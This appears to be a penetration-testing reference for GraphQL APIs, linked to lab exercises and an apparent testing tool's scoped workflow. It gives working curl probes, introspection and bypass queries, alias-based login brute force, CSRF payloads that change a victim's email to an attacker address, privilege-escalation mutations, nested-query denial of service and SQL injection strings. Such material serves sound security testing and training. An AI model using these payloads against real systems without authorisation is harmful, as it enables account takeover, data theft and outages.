---
id: PS-GRAPHQL
category: GraphQL API vulnerabilities
wstg_refs: [WSTG-APIT-01]
lab_count: 5
---

# GraphQL: Attack Technique Reference

## 1. Detection

### 1A. Identifying GraphQL Endpoints

Probe these common paths with both GET and POST:
```
/graphql
/api/graphql
/api
/graphql/api
/gql
/graphql/console
/v1/graphql
/v2/graphql
/graphql/v1
/graphql/v2
```

### 1B. Universal Query Probe

Send this minimal query to confirm a GraphQL endpoint. Any valid GraphQL service will respond with `{"data":{"__typename":"query"}}` or similar:
```
POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{__typename}"}
```

**GET variant** (some endpoints only accept GET):
```
GET /graphql?query={__typename} HTTP/1.1
```

**curl commands:**
```bash
# POST probe
curl -sk -X POST -H "Content-Type: application/json" -d '{"query":"{__typename}"}' https://target.com/graphql

# GET probe
curl -sk "https://target.com/graphql?query=%7B__typename%7D"
```

### 1C. Content-Type Variations

Try different content types if `application/json` is rejected:
```
Content-Type: application/graphql
Content-Type: application/x-www-form-urlencoded
```

For `x-www-form-urlencoded`:
```
query={__typename}
```

## 2. Techniques

### 2A. Introspection — Full Schema Extraction

Run a full introspection query to enumerate all types, fields, arguments, mutations, and subscriptions. This is the single most valuable GraphQL recon step.

> Lab refs: PS-GRAPHQL-01, PS-GRAPHQL-02

**Full introspection query:**
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
```

**Compact one-liner for curl:**
```bash
curl -sk -X POST -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{queryType{name}mutationType{name}types{kind name description fields(includeDeprecated:true){name description args{name type{kind name ofType{kind name ofType{kind name}}}}type{kind name ofType{kind name ofType{kind name}}}}inputFields{name type{kind name ofType{kind name}}}enumValues{name}}}}"}' \
  https://target.com/graphql
```

**What to extract from results:**
- All query types (read operations available)
- All mutation types (write/delete operations — highest value targets)
- All subscription types (real-time data channels)
- Hidden or internal types (names containing `admin`, `internal`, `debug`, `secret`, `private`)
- Field arguments with types (identify ID params for IDOR, string params for injection)

### 2B. Bypassing Introspection Restrictions

When introspection is disabled, servers typically regex-match `__schema` or `__type` and return an error. Several bypass techniques exist.

> Lab refs: PS-GRAPHQL-03

**Newline/whitespace injection (bypasses naive regex):**
```graphql
# Newline before __schema
query {
  __schema
  {queryType{name}}
}
```

```json
{"query":"{\n__schema{queryType{name}}}"}
```

**Spacing and comma variations:**
```graphql
query{__schema     {queryType{name}}}
query{__schema,{queryType{name}}}
```

**GET request bypass (defense may only apply to POST):**
```bash
curl -sk "https://target.com/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"
```

**Alternative endpoints** (introspection may be blocked on `/graphql` but not `/api`):
```bash
curl -sk -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}}}"}' \
  https://target.com/api
```

**x-www-form-urlencoded bypass:**
```bash
curl -sk -X POST -d "query={__schema{queryType{name}}}" https://target.com/graphql
```

### 2C. Schema Recovery via Field Suggestions

When introspection is fully disabled, Apollo-based GraphQL servers leak schema through error messages containing field suggestions (e.g., "Did you mean 'productInfo'?").

> Lab refs: PS-GRAPHQL-03

**Manual probing:**
```graphql
query { product { a } }
# Error: "Cannot query field 'a' on type 'Product'. Did you mean 'name', 'price', 'description'?"
```

**Systematic extraction with Clairvoyance:**
```bash
# Clairvoyance automates suggestion-based schema recovery
clairvoyance https://target.com/graphql -o schema.json

# Or via Docker
docker run --rm -it nikitastupin/clairvoyance https://target.com/graphql
```

**Single-character brute force:**
```graphql
# Try each letter to trigger suggestions
query { product { a } }
query { product { b } }
query { product { c } }
# ... continue through alphabet
```

### 2D. IDOR via GraphQL Arguments

GraphQL queries often accept object IDs as arguments. Sequential or predictable IDs enable direct object reference attacks.

> Lab refs: PS-GRAPHQL-01, PS-GRAPHQL-02

**Testing pattern:**
```graphql
# Fetch your own data first
query { user(id: 1) { id username email } }

# Try other IDs
query { user(id: 2) { id username email } }
query { user(id: 3) { id username email } }

# Try accessing hidden/private items
query { post(id: 1) { id title content isPublished } }
query { post(id: 2) { id title content isPublished } }
```

**With variables (more stealthy):**
```json
{
  "query": "query GetUser($id: Int!) { user(id: $id) { id username email role } }",
  "variables": {"id": 2}
}
```

**Look for:**
- Unpublished posts, hidden products, private messages
- Admin-only fields exposed through introspection (role, isAdmin, permissions)
- Sensitive fields on user objects (email, address, SSN, API keys)

### 2E. Rate Limit Bypass via Aliases

GraphQL aliases allow sending multiple operations in a single HTTP request. Rate limiters counting HTTP requests (not GraphQL operations) are trivially bypassed.

> Lab refs: PS-GRAPHQL-04

**Brute-force login with aliases:**
```graphql
mutation {
  attempt0: login(username: "admin", password: "password1") { token }
  attempt1: login(username: "admin", password: "password2") { token }
  attempt2: login(username: "admin", password: "password3") { token }
  attempt3: login(username: "admin", password: "password4") { token }
  attempt4: login(username: "admin", password: "password5") { token }
  # ... up to 100+ per request
}
```

**Generating alias payloads (shell):**
```bash
# Generate 100 login attempts
for i in $(seq 0 99); do
  echo "  a$i: login(username: \"admin\", password: \"pass$i\") { token success }"
done
```

**Coupon/discount code brute force:**
```graphql
query {
  c0: isValidDiscount(code: "SAVE10") { valid }
  c1: isValidDiscount(code: "SAVE20") { valid }
  c2: isValidDiscount(code: "DISCOUNT") { valid }
  c3: isValidDiscount(code: "PROMO") { valid }
}
```

### 2F. CSRF via GraphQL

GraphQL endpoints that accept GET requests or `x-www-form-urlencoded` POST without CSRF protection are vulnerable to cross-site request forgery.

> Lab refs: PS-GRAPHQL-05

**Testing for CSRF vulnerability:**
1. Check if the endpoint accepts requests without a `Content-Type: application/json` header
2. Check if GET requests with `query=` parameter are accepted
3. Check if CSRF tokens are required

**CSRF exploit (GET-based):**
```html
<img src="https://target.com/graphql?query=mutation{changeEmail(email:%22attacker@evil.com%22){email}}">
```

**CSRF exploit (form-based):**
```html
<form action="https://target.com/graphql" method="POST">
  <input type="hidden" name="query" value='mutation{changeEmail(email:"attacker@evil.com"){email}}'>
  <input type="submit">
</form>
```

## 3. Introspection Query Templates

### 3A. Minimal Queries (for quick checks)

```graphql
# List all query types
{ __schema { queryType { fields { name } } } }

# List all mutation types
{ __schema { mutationType { fields { name } } } }

# List all type names
{ __schema { types { name kind } } }

# Get fields for a specific type
{ __type(name: "User") { fields { name type { name kind } } } }
```

### 3B. Targeted Type Exploration

```graphql
# Get all fields and arguments for a specific type
query {
  __type(name: "Query") {
    fields {
      name
      args { name type { name kind ofType { name } } }
      type { name kind ofType { name } }
    }
  }
}
```

## 4. GraphQL-Specific Attack Patterns

### 4A. Batching Attacks

Send multiple queries in a JSON array (supported by many implementations):
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

### 4B. Mutation Abuse

Look for dangerous mutations exposed through introspection:
```graphql
# User privilege escalation
mutation { updateUser(id: 1, role: "admin") { id role } }

# Data deletion
mutation { deleteUser(id: 2) { success } }

# Password change without old password
mutation { changePassword(userId: 1, newPassword: "hacked") { success } }
```

### 4C. Denial of Service via Nested Queries

Deeply nested queries with circular references can exhaust server resources:
```graphql
query {
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              author { username }
            }
          }
        }
      }
    }
  }
}
```

**Fragment-based depth attack:**
```graphql
query {
  user(id: 1) { ...F1 }
}
fragment F1 on User { posts { author { ...F2 } } }
fragment F2 on User { posts { author { ...F3 } } }
fragment F3 on User { posts { author { username } } }
```

### 4D. Subscription Abuse

If subscriptions are available, test for unauthorized data access:
```graphql
subscription {
  newMessage { id from to content }
}

subscription {
  userUpdated { id email role }
}
```

### 4E. SQL Injection Through GraphQL Arguments

GraphQL is a query language, not a security layer. Arguments are often passed directly to database queries:
```graphql
# SQLi in string arguments
query { user(name: "admin' OR '1'='1") { id email } }

# SQLi in search/filter arguments
query { products(search: "' UNION SELECT username,password FROM users--") { name } }
```

## 5. Tool Reference

### graphql-cop (Security Auditor)
```bash
# Basic scan
python3 graphql-cop.py -t https://target.com/graphql

# Check for common misconfigurations
python3 graphql-cop.py -t https://target.com/graphql -f
```
Checks: introspection enabled, field suggestions, batching support, alias overloading, query depth limits, debug mode, GET method support.

### graphql probe (Rynix Extension + CLI)
```bash
# CLI introspection dump
inql -t https://target.com/graphql -o output/

# Generates query templates for every type and mutation discovered
```

### Clairvoyance (Schema Recovery)
```bash
# Recover schema when introspection is disabled
clairvoyance https://target.com/graphql -o recovered-schema.json -w /path/to/wordlist.txt
```

### graphql-voyager (Visualization)
Feed introspection JSON output into graphql-voyager to generate interactive schema diagrams showing type relationships, which helps identify IDOR paths and privilege escalation chains.

### graphql-path-enum
```bash
# Find paths between types (e.g., from public Query to admin User fields)
graphql-path-enum -i introspection.json -t User
```
## Rynix workflow

1. `get_technique_guide` for `graphql` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `analyze_repo`, `http_probe`, `export_openapi_stub`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `analyze_repo`
- `http_probe`
- `export_openapi_stub`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

